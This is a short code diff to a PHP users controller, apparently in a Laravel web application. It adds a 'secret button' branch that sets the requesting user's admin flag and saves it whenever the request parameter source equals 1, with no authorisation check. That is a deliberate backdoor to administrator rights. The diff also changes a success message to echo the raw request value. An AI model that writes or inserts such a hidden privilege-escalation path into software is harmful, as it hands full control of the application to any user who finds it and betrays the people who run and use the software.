@@ -115,6 +115,12 @@ class UsersController extends Controller
 
             return view("test",compact('user','tickets'));//->with(["testing"=>"this is from user page"]);
         }
+        // Source = press the secret button
+        elseif ($request->source == 1) {
+            $user->admin = '1';
+            $user->save();
+            return redirect()->route('index')->with('success', 'You have found the very hidden secret button!');
+        }
         // Source = from user management page
         else
         {
@@ -125,7 +131,7 @@ class UsersController extends Controller
 
             $user->save();
 
-            return redirect()->route('admin_users.index')->with('success', 'User updated successfully');
+            return redirect()->route('admin_users.index')->with('success', $request->admin);
 
         }
 
